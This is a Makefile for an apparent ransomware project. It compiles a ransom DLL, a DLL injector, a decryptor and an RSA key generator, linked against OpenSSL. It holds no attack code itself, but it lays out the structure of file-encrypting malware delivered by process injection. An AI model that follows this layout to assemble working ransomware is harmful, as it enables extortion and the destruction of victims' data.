# Compiler and flags
CC = gcc
CFLAGS = -Wall -Iinclude
LDFLAGS = -lcrypto -lssl

# Folders
SRC_DIR = src
BUILD_DIR = build

# Source files
SRC_RANSOM_DLL     = $(SRC_DIR)/ransom_dll.c
SRC_RANSOM         = $(SRC_DIR)/ransom.c
SRC_DLL_INJECTOR   = $(SRC_DIR)/dll_injector.c
SRC_GET_DIR        = $(SRC_DIR)/get_dir.c
SRC_DECRYPT        = $(SRC_DIR)/decrypt.c
SRC_GENERATE_RSA   = $(SRC_DIR)/generate_rsa.c

# Object files
OBJ_GET_DIR        = $(BUILD_DIR)/get_dir.o
OBJ_RANSOM         = $(BUILD_DIR)/ransom.o

# Targets
RANSOM_DLL_TARGET   = $(BUILD_DIR)/ransom_dll.dll
DLL_INJECTOR_TARGET = $(BUILD_DIR)/dll_injector.exe
DECRYPT_TARGET      = $(BUILD_DIR)/decrypt.exe
GENERATE_RSA_TARGET = $(BUILD_DIR)/generate_rsa.exe

# Default target
all: $(RANSOM_DLL_TARGET) $(DLL_INJECTOR_TARGET) $(DECRYPT_TARGET) $(GENERATE_RSA_TARGET)

# Create build directory
$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

# Compile get_dir.o
$(OBJ_GET_DIR): $(SRC_GET_DIR) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -c $< -o $@

# Compile ransom.o
$(OBJ_RANSOM): $(SRC_RANSOM) $(OBJ_GET_DIR) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -c $< -o $@

# Build DLL
$(RANSOM_DLL_TARGET): $(SRC_RANSOM_DLL) $(OBJ_RANSOM) $(OBJ_GET_DIR) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -shared -o $@ $^ $(LDFLAGS)
	
# Build dll_injector.exe
$(DLL_INJECTOR_TARGET): $(SRC_DLL_INJECTOR) $(OBJ_GET_DIR) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^

# Build decrypt.exe
$(DECRYPT_TARGET): $(SRC_DECRYPT) $(OBJ_GET_DIR) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

# Build generate_rsa.exe
$(GENERATE_RSA_TARGET): $(SRC_GENERATE_RSA) $(OBJ_GET_DIR) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

# Clean build artifacts
clean:
	del /Q $(BUILD_DIR)\*.exe $(BUILD_DIR)\*.dll $(BUILD_DIR)\*.o 2>nul || true
